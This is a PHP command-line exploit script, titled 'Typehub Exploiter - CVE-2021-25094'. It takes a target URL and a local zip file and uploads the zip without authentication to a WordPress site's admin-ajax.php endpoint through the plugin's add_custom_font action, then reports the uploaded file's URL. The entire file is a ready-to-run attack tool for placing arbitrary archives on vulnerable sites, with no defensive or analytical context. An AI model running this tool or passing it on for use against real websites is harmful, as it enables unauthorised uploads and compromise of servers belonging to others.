<?php
a:
$ban = "\e[1m{ Typehub Exploiter - CVE-2021-25094 }\e[0m\n\e[3m_Coded by @xdx57\e[0m\n\n";
system('clear');


print $ban;
$a = readline('#_Url: ');

if(is_file('.zip_tmp')){
	$k = strtolower(readline("Use `".file_get_contents('.zip_tmp').'` Y/n : '));
}

if(@$k == 'y'){
	$zip = file_get_contents('.zip_tmp');
}else{
	$zip = readline('#_Zip: ');
}

system('clear');

if(empty($a) || empty($zip)) {
	die($ban."Error: Undefined variable Url/Zip\n");
}elseif(!is_file($zip)){
	die($ban."Error: `$zip` No such file.\n");
}elseif(strtolower(pathinfo($zip, PATHINFO_EXTENSION)) != 'zip'){
	die($ban."Error: `$zip` Invalid zip extension.\n");
}

file_put_contents('.zip_tmp',$zip);

$ua = 'xdx'.rand(1,57);
$a = substr($a,-1,1) == '/' ? $a:$a.'/';
$a = preg_match('/wp-content/',$a) ? explode('wp-content',$a)[0] : $a;
$a = substr($a,0,4) != 'http' ? 'http://'.$a : $a;
$b = $a.'wp-admin/admin-ajax.php';
print "{$ban}Target\t: $a\nZipFile\t: $zip\n\n";

$exe = json_decode(shell_exec("curl -sL --user-agent $ua $b -F \"action=add_custom_font\" -F \"file=@$zip\""));
print "Status\t: ";
if($exe){
	if(!empty($msg=ucfirst(@$exe->{'status'}))){
		print "$msg\n";
		if($msg == 'File already exists'){
			$n = rand(111,999).'.zip';
			print "System\t: $zip -> $n ";
			if(rename($zip,$n)){
				print "-> Done\n";
				sleep(5);
				system("php $argv[0] $a $n");
			}else{
				die("-> Something is wrong\n");
			}
		}
		if(!empty($url=@$exe->{'url'})){
			print "Url\t: $url\n";
		}
	}
}else{
	print "\e[91mCan't Execute Command\e[0m\n";
}

readline();goto a;